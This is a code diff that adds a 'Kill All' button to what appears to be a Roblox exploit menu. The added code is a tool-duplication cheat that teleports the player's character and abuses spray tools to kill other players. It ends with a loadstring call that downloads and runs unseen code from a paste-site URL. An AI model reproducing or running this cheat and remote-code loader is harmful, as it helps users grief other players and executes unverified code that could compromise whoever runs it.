@@ -373,6 +373,67 @@ Tab9:AddButton({
 })
 
 Tab9:AddButton({
+    Name = "Kill All",
+    Callback = function()
+        --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+--[[Credits: joey9876a]]--
+
+--DupetoolsSpray
+
+local plr = game:GetService("Players").LocalPlayer
+local backpack = plr.Backpack
+local char = plr.Character
+local root = char.HumanoidRootPart
+local humanoid = char.Humanoid
+local old = root.CFrame
+local spraybutton = workspace.Fencing.SprayButton
+local sprays = {}
+local number = 10
+if backpack:FindFirstChild("Spray") or char:FindFirstChild("Spray") then
+    error("You must not have any sprays when executing this script")
+end
+while #sprays < number do
+    root.CFrame = spraybutton.CFrame
+    local spray = char:WaitForChild("Spray")
+    spray.Parent = workspace
+    sprays[#sprays+1] = spray
+end
+root.CFrame = root.CFrame + Vector3.new(0,100,0)
+task.wait(0.1)
+for i,v in pairs(sprays) do
+    if v.Parent == workspace then
+        root.Velocity = Vector3.zero
+        root.CFrame = v.Handle.CFrame
+        v.AncestryChanged:Wait()
+        task.wait()
+        v.Parent = backpack
+    end
+end
+task.wait()
+humanoid:UnequipTools()
+task.wait()
+for i,v in pairs(backpack:GetChildren()) do
+    if v.Name == "Spray" and not table.find(sprays, v) then
+        root.Velocity = Vector3.zero
+        root.CFrame = CFrame.new(1500,-400,1500)
+        v.Parent = char
+        task.wait()
+        v.Parent = workspace
+        task.wait(0.1)
+    end
+end
+task.wait()
+root.CFrame = old humanoid:ChangeState("GettingUp")
+
+--kill players DigitalityScripts--
+
+loadstring(game:HttpGet(('https://paste.c-net.org/CreepedLeary'),true))()
+    end    
+})
+
+Tab9:AddButton({
     Name = "Fe Leg Resize",
     Callback = function()
         --[[
